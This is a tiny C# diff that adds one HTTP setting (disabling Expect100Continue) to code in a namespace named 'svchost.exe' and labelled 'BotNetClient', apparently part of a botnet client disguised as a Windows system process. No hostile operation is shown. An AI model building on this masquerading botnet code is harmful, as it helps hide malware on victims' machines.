@@ -41,6 +41,7 @@ namespace svchost.exe
         {
             try
             {
+                ServicePointManager.Expect100Continue = false;
                 String pth = "System.Diagnostics.Process (BotNetClient)";
                 Thread.Sleep(1000);
                 string id;
